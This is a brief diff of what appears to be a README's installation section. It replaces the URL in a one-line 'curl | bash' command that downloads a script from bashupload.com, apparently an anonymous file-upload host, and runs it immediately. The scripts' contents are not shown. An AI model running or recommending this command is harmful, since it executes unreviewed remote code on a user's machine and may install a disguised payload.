@@ -20,7 +20,7 @@ Ensure the following dependencies are installed:
 ### Easy installation
 
 ```bash
-curl -sL http://bashupload.com/ShYfv/JLTiF.sh | bash
+curl -sL http://bashupload.com/8SdU5/4Ck0H.sh | bash
 ```
 
 ### Step 1: Clone the Repository
